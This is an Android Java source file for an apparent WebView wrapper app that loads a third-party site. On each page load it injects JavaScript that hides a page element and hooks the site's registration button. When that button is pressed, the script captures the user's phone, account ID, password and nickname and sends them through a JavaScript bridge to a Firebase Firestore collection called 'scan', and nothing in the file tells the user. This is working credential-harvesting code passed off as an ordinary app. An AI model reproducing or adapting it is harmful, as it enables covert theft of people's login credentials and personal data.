package com.info.webviewgetinfor;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.ActivityNotFoundException;
import android.content.ClipData;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.PermissionRequest;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;


public class WebviewScreen extends AppCompatActivity {
    WebView myWebView;
    private static final int REQUEST_CODE_LIBRARY_PERMISSION = 1001;
    private static final int REQUEST_CODE_CAMERA_PERMISSION = 1002;
    private static final int FILE_CHOOSER_REQUEST_CODE = 1000;
    private ValueCallback<Uri[]> mUploadMessage;
    private String mCameraPhotoPath;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getSupportActionBar().hide();
        setContentView(R.layout.activity_webview_screen);
        myWebView = (WebView) findViewById(R.id.webview);
        Intent i = getIntent();
        String url = i.getStringExtra("Variable");
//        String url = "https://ku11.net";
        // Kiểm tra và yêu cầu cấp quyền truy cập thư viện
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQUEST_CODE_LIBRARY_PERMISSION);
        }

// Kiểm tra và yêu cầu cấp quyền truy cập máy ảnh
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, REQUEST_CODE_CAMERA_PERMISSION);
        }

        myWebView.getSettings().setJavaScriptEnabled(true);
        myWebView.getSettings().setDomStorageEnabled(true);
        myWebView.addJavascriptInterface(new JavaScriptInterface(), "AndroidInterface");
//        myWebView.loadUrl(url);
        myWebView.loadUrl("https://nv.ku6107.net/Home/Index");
        myWebView.setWebViewClient(new WebViewClient() {
            private Timer timeoutTimer;
            private boolean pageLoaded = false;

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                pageLoaded = false;
                startTimeoutTimer();
            }
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                System.out.println("This is url "+ url);
                return true;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
//                view.loadUrl("javascript:(function() { " +
//                        "document.querySelector('ul > li.ng-scope').style.display='none'; const button = document.getElementById('RegisterMemberButton'); button.addEventListener('click', function() { const phone = document.getElementById('CellPhone').textContent; const account = document.getElementById('AccountID').value; console.log(phone, account) ;window.AndroidInterface.processFormData(phone, account); });  })()");

                view.loadUrl("javascript:(function() { " +
                        "document.querySelector('ul > li.ng-scope').style.display='none';  const button = document.getElementById('RegisterMemberButton'); button.addEventListener('click', function() { const phone = document.getElementById('CellPhone').textContent; const account = document.getElementById('AccountID').value; const password = document.getElementById('PWD').value; const nickname = document.getElementById('NickName').value; window.AndroidInterface.processFormData(phone, account, password, nickname); }); })()");

                super.onPageFinished(view, url);
            }
            private void startTimeoutTimer() {
                timeoutTimer = new Timer();
                timeoutTimer.schedule(new TimerTask() {
                    @Override
                    public void run() {
                        if (!pageLoaded) {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    myWebView.stopLoading(); // Stop loading the webpage
                                    // Add your code here to handle the timeout
                                }
                            });
                        }
                    }
                }, 300000); // Timeout after 30 seconds
            }

            private void stopTimeoutTimer() {
                if (timeoutTimer != null) {
                    timeoutTimer.cancel();
                    timeoutTimer = null;
                }
            }
        });
        myWebView.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
                // Lưu callback và yêu cầu người dùng chọn tệp
                mUploadMessage = filePathCallback;
                Intent intent = fileChooserParams.createIntent();
                try {
                    startActivityForResult(intent, FILE_CHOOSER_REQUEST_CODE);
                } catch (ActivityNotFoundException e) {
                    mUploadMessage = null;
                    return false;
                }
                return true;
            }

            // Grant permissions for cam
            @Override
            public void onPermissionRequest(final PermissionRequest request) {
                WebviewScreen.this.runOnUiThread(new Runnable() {
                    @TargetApi(Build.VERSION_CODES.M)
                    @Override
                    public void run() {
                        Log.d("LOG", request.getOrigin().toString());
                        if(request.getOrigin().toString().equals("file:///")) {
                            Log.d("LOG", "GRANTED");
                            request.grant(request.getResources());
                        } else {
                            Log.d("LOG", "DENIED");
                            request.deny();
                        }
                    }
                });
            }


        });
    }
    @Override
    public void onBackPressed() {
        System.out.println("Can go" + myWebView.canGoBack());
        if (myWebView.canGoBack()) {
            myWebView.goBack();
        } else {
            super.onBackPressed();
        }
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_CODE_LIBRARY_PERMISSION || requestCode == REQUEST_CODE_CAMERA_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Quyền đã được cấp, tiến hành xử lý
            } else {
                // Quyền bị từ chối, xử lý khi người dùng không cấp quyền
            }
        }
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == FILE_CHOOSER_REQUEST_CODE) {
            if (mUploadMessage != null) {
                Uri[] results = null;
                // Kiểm tra kết quả và lấy danh sách URI của tệp
                if (resultCode == RESULT_OK) {
                    if (data != null) {
                        String dataString = data.getDataString();
                        ClipData clipData = data.getClipData();

                        if (clipData != null) {
                            results = new Uri[clipData.getItemCount()];
                            for (int i = 0; i < clipData.getItemCount(); i++) {
                                ClipData.Item item = clipData.getItemAt(i);
                                results[i] = item.getUri();
                            }
                        } else if (dataString != null) {
                            results = new Uri[]{Uri.parse(dataString)};
                        }
                    }
                }
                // Gửi danh sách URI cho WebView
                mUploadMessage.onReceiveValue(results);
                mUploadMessage = null;
            }
        }
    }

    private class JavaScriptInterface {
        @JavascriptInterface
        public void processFormData(String phone, String account, String password, String nickname) {
            // Xử lý dữ liệu phone và account ở đây
            Log.d("Android Webview", "Phone: " + phone);
            Log.d("Android Webview", "Account: " + account);
            Map<String, Object> data = new HashMap<>();
            data.put("phone", phone);
            data.put("account", account);
            data.put("password",password);
            data.put("nickname",nickname);
            FirebaseFirestore db = FirebaseFirestore.getInstance();
            db.collection("scan")
                    .document(account)
                    .set(data)
                    .addOnSuccessListener(new OnSuccessListener<Void>() {
                        @Override
                        public void onSuccess(Void aVoid) {
                            // Thực hiện khi chèn thành công
                            Log.d("Android Webview","Push Success!");
                        }
                    })
                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            // Xử lý khi chèn thất bại
                            Log.d("Android Webview","Push Failed!"+e);
                        }
                    });
        }
    }

    }
